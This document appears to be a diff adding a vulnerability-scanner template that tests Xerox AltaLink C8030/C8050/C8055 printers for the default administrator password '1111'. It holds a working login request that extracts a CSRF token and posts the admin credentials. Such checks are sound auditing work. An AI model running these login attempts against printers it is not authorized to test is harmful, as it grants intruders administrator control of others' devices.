@@ -1,0 +1,72 @@
+id: xerox-altalink-default-login
+
+info:
+  name: Xerox AltaLink Printer - Default Login
+  author: mr-pmillz
+  severity: medium
+  description: |
+    Xerox AltaLink C8030, C8050, and C8055 printers may retain the default administrator password 1111.
+    This template checks that shared default password; devices using a serial-number-based password are outside its credential set.
+  impact: |
+    An attacker can access the Embedded Web Server with administrator privileges and modify printer settings.
+  remediation: |
+    Change the administrator password to a unique value and restrict access to the Embedded Web Server to trusted hosts.
+  reference:
+    - https://download.support.xerox.com/pub/docs/ALB80XX/userdocs/any-os/en_GB/XeroxAltaLinkSeries_sag_en-us.pdf
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    verified: true
+    vendor: xerox
+    product: altalink
+  tags: default-login,xerox,altalink,printer,intrusive
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /properties/authentication/login.php?tab=stat&redir=%2Fstat%2Fwelcome.php%3Ftab%3Dstatus HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+        Referer: {{RootURL}}/stat/welcome.php?tab=status
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - '<input\stype="hidden"\sname="CSRFToken"\svalue="([[:alnum:]]{128})">'
+
+  - raw:
+      - |
+        POST /userpost/xerox.set HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: statusSelected=n1; statusNumNodes=8;
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{BaseURL}}
+        Referer: {{RootURL}}/properties/authentication/login.php?tab=stat&redir=%2Fstat%2Fwelcome.php%3Ftab%3Dstatus
+
+        _fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php%3Ftype%3D%26authStatus%3D&frmwebUsername={{username}}&frmwebPassword={{password}}&frmaltDomain=default&CSRFToken={{csrf_token}}
+
+    payloads:
+      username:
+        - admin
+        - Admin
+      password:
+        - "1111"
+    attack: clusterbomb
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "document.location = '/stat/welcome.php';"
+          - "document.location = '/stat/welcome.php?tab=status';"
+
+      - type: status
+        status:
+          - 200
